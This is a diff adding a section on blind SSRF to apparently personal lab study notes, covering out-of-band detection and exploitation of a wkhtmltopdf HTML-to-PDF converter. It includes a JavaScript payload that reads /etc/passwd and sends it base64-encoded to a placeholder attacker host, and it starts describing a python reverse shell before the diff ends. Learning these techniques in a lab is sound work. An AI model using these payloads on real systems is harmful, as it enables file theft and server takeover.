@@ -392,4 +392,93 @@ then use `rce` to run or use encoder to find flag
 
 ![](Images/Pasted%20image%2020240212192951.png)
 
+## Blind SSRF 
+
+in blind SSRF even though the request is processed we can't see the backend server's response 
+
+we can detect these via out-of-band techniques which make the server issue a request to an external service under our control   
+can detect if a backend service is processing our requests with either a server using a public IP that we own or services like: 
+- burp collaborator (pro) 
+- pingb.in
+
+blind ssrf can exist in pdf document generators and HTTP headers among other locations 
+
+## Blind SSRF Exploitation Example
+
+our target receives an html file and returns a PDF document: 
+
+![](Images/Pasted%20image%2020240212201436.png)
+
+when uploading a file we get the same response from the server every time, and there isn't any observed response on the frontend either: 
+
+![](Images/Pasted%20image%2020240212201532.png)
+
+in order to test for blind SSRF we can first create an HTML file containing a link to a service under our control 
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+	<a>Hello World!</a>
+	<img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
+</body>
+</html>
+```
+
+the service can be a web server we are hosting, burp collaborator, pingb.in url, etc.   
+the protocols we can use when using out-of-band techniques include HTTP, DNS, FTP, etc. 
+
+we can start with a netcat listener on port 9090: 
+
+![](Images/Pasted%20image%2020240212201959.png)
+
+when we use the app to submit our html with our service inside of it we get our response: 
+
+![](Images/Pasted%20image%2020240212202128.png)
+
+from the response we can see the User-Agent is `wkhtmltopdf`  
+without sanitation this is a very vulnerable application to javascript code  
+we can execute JS in `wkhtmltopdf` with the following file: 
+
+```html
+<html>
+    <body>
+        <b>Exfiltration via Blind SSRF</b>
+        <script>
+        var readfile = new XMLHttpRequest(); // Read the local file
+        var exfil = new XMLHttpRequest(); // Send the file to our server
+        readfile.open("GET","file:///etc/passwd", true); 
+        readfile.send();
+        readfile.onload = function() {
+            if (readfile.readyState === 4) {
+                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
+                exfil.open("GET", url, true);
+                exfil.send();
+            }
+        }
+        readfile.onerror = function(){document.write('<a>Oops!</a>');}
+        </script>
+     </body>
+</html>
+```
+
+in this code we are using two `XMLHttpRequest` objects, one to read the local file and the other to send it to our server   
+we also use `btoa` function to send the data encoded in base64
+
+now with our listener we can submit the JS payload and get the response: 
+
+![](Images/Pasted%20image%2020240212202701.png)
+
+then we can decode the base64 data: 
+
+![](Images/Pasted%20image%2020240212202757.png)
+
+this target also has the same `internal.app.local` application like the previous exercise   
+let us now compromise the underlying server with an HTML document with a payload that will exploit the local app listening on `internal.app.local`
+
+we could see last time that the server was using python so lets create a bash reverse shell that uses python to gain RCE: 
+
+![](Images/Pasted%20image%2020240212203110.png)
+
+lets put this in an HTML file that performs a GET request to `internal.app.local` then uses its local app vulnerable to RCE via SSRF and executes our reverse shell (the `x` parameter from the previous exercise): 
 
